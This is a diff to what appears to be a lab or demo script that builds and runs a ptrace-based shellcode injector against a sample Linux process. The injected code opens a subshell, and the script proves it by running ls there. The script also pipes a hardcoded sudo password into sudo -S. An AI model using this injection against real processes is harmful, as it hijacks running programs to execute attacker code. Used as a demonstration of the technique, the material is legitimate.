@@ -1,4 +1,23 @@
-git clone https://github.com/W3ndige/linux-process-injection.git
-开一个ssh，运行sample程序
-开另一个ssh，运行inject程序（需提权），sample程序被劫持
-
+;
+#nohup
+cd /home/ubuntu/attack/linux-process-injection/sample-process
+gcc -o sample sample.c
+screen -S myscreen -d -m ./sample
+#pre
+cd /home/ubuntu/attack/linux-process-injection
+gcc -o inject inject.c
+#check
+pid=$(pgrep sample)
+echo '010404' | sudo -S /home/ubuntu/attack/linux-process-injection/inject $pid
+temp_file=$(mktemp)
+screen -S myscreen -X stuff "ls > $temp_file\n"
+sleep 1
+echo "利用ptrace系统调用将shellcode注入sample进程(pid:$pid)，shellcode执行将打开子shell，在该shell中执行ls命令："
+cat $temp_file
+rm $temp_file
+#clean
+cd /home/ubuntu/attack/linux-process-injection
+rm inject
+cd sample-process
+rm sample
+screen -S myscreen -X quit
